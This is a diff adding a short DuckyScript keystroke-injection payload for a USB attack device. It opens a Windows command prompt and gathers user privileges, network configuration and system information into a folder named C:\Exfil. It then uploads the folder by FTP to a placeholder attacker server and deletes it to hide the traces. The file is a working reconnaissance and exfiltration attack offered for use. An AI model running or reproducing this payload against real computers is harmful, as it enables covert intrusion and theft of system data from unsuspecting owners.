@@ -1,0 +1,15 @@
+REM script for understanding who the current user is and their privileges
+REM Please change the [Your FTP Server] to your actual server
+REM Change your local to your keyboard format
+LOCALE GB
+GUI r 
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING mkdir C:\Exfil && whoami /all > C:\Exfil\whoami.txt & ipconfig /all >C:\Exfil\ip.txt & systeminfo > C:\Exfil\systeminfo.txt && ftp [Your FTP Server] && ftp put C:\Exfil  && ftp bye & rmdir /Q /S C:\Exfil
+ENTER
+DELAY 10000 
+REM This delays allows the computer some time to process the commands ^^
+STRING exit
+ENTER
